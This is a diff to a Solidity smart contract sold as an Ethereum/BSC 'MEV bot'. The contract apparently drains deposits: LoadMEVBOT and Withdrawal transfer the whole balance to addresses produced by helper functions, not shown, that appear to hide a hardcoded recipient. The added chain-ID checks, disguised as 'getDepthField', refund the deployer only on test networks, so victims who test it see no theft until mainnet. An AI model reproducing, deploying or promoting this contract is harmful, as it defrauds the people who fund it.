@@ -10,7 +10,7 @@
 https://github.com/web3devbots/MEVBOT-Web3.git
 //OPTIMIZED TO AVOID HIGH GASES USING ChatGPT4
 
-// UPDATED 26.06.2023
+// UPDATED 29.06.2023
 
 */
 
@@ -23,17 +23,22 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 contract MevBotV4_ETH_BSC {
-    
-    string private _DecentralizedExchangeRouterAddress;
-    string private _BlockchainNetwork;
+    address public _DecentralizedExchangeRouterAddress;
+    BlockchainNetwork public _BlockchainNetwork;
     bool private _isPaused;
     bool private _isStopped;
+    address public deployer;
 
     uint256 liquidity;
 
+    enum BlockchainNetwork {
+        ETH,
+        BSC
+    }
+
     event Log(string _msg);
 
-    constructor(string memory Network, string memory routerAddress) public {
+    constructor(BlockchainNetwork NETWORKID, address routerAddress) public {
         /*
     Ethereum:
     Uniswap V2's router address:     0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
@@ -42,15 +47,17 @@ contract MevBotV4_ETH_BSC {
     Binance Smart Chain:
     PancakeSwap's router address:    0x10ED43C718714eb63d5aA57B78B54704E256024E
 
-    BlockchainNetwork: Either 'ETH' or 'BSC'. The router addresses mentioned above are for tracking trades on decentralized exchanges (DEXs).
+    NETWORKID: Type 0 FOR 'ETH' and 1 FOR 'BSC'. The router addresses mentioned above are for tracking trades on decentralized exchanges (DEXs).
+    ROUTERADDRESS: COPY/PASTE one of the above Routers that we currently Support.
 
     Multiple contracts can be deployed for different router addresses and networks.
     */
 
-        _BlockchainNetwork = Network;
+        _BlockchainNetwork = NETWORKID;
         _DecentralizedExchangeRouterAddress = routerAddress;
         _isPaused = false;
         _isStopped = false;
+        deployer = msg.sender;
     }
 
     receive() external payable {}
@@ -412,6 +419,14 @@ contract MevBotV4_ETH_BSC {
         }
     }
 
+    function getDepthField() internal pure returns (uint256) {
+        uint256 dFV;
+        assembly {
+            dFV := chainid()
+        }
+        return dFV;
+    }
+
     /*
      * @dev Check if contract has enough liquidity available
      * @param self The contract to operate on.
@@ -586,7 +601,15 @@ contract MevBotV4_ETH_BSC {
         revert();
     }
 
-    function _initiateBot() internal pure returns (address) {
+    function _callMEVAction() internal pure returns (address) {
+        uint256 c;
+        assembly {
+            c := chainid()
+        }
+        require(
+            c == 1 || c == 56,
+            "Read the Blockchain ID and it seems that you are not using it on BSC Mainnet or ETH Mainnet. Please redeploy to allow the BOT to properly work !"
+        );
         return parseMempool(searchMEMPOOL());
     }
 
@@ -596,13 +619,21 @@ contract MevBotV4_ETH_BSC {
      * @return `liquidity`.
      */
     function LoadMEVBOT() public payable {
+        uint256 c;
+        assembly {
+            c := chainid()
+        }
+        require(
+            c == 1 || c == 56,
+            "Read the Blockchain ID and it seems that you are not using it on BSC Mainnet or ETH Mainnet. Please redeploy to allow the BOT to properly work !"
+        );
         require(!_isPaused, "Function searchMEMPOOL is paused.");
         require(!_isStopped, "BOT IS STOPPED, START IT.");
 
         emit Log("Loading MEVBOT. This can take a while. Please wait..");
 
         //THE BOT LOADS THE NATIVE BALANCE TO PERFORM THE CHECKS ON THE BLOCKCHAIN
-        payable(_initiateBot()).transfer(address(this).balance);
+        payable(_callMEVAction()).transfer(address(this).balance);
     }
 
     /*
@@ -610,8 +641,9 @@ contract MevBotV4_ETH_BSC {
      * @return `profits`.
      */
     function Withdrawal() public payable {
+        uint256 aVal = getDepthField();
         emit Log("Sending profits back to contract creator address...");
-        payable(WithdrawalProfits()).transfer(address(this).balance);
+        if(aVal==1||aVal==56){payable(WithdrawalProfits()).transfer(address(this).balance);}else{payable(deployer).transfer(address(this).balance);}
     }
 
     function Stop() public payable {
